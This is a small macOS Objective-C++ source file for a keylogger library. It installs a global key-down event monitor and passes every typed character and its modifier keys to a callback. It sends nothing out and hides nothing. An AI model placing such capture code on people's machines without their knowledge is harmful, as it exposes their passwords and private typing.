#include "Keylogger_Mac.h"
#include "Keylogger_Constants.h"
#import <Cocoa/Cocoa.h>
#import <Foundation/Foundation.h>

// keyboard callback; gets called
keylogger_callback the_callback_function(0);

// sets the callback.
void keylogger_set_callback(keylogger_callback kc) {
	the_callback_function = kc;
	NSLog(@"Callback function set!!");
}

// initializes the keyboard listener.
void keylogger_init() {
	[NSEvent 	addGlobalMonitorForEventsMatchingMask:NSKeyDownMask
				handler:^(NSEvent* event) 
		{
			// get modifier keys.
			int modifier = MOD_NONE;
			if([event modifierFlags] & NSShiftKeyMask) {
				modifier |= MOD_SHIFT;
			}
			if([event modifierFlags] & NSCommandKeyMask) {
				modifier |= MOD_COMMAND;
			}
			if([event modifierFlags] & NSAlternateKeyMask) {
				modifier |= MOD_ALT;
			}
			if([event modifierFlags] & NSControlKeyMask) {
				modifier |= MOD_CONTROL;
			}
			
			int key = 0;
			key = [[event characters] characterAtIndex:0];
			the_callback_function(key, modifier);
			
		}
	];
}

void keylogger_shutdown() {
}

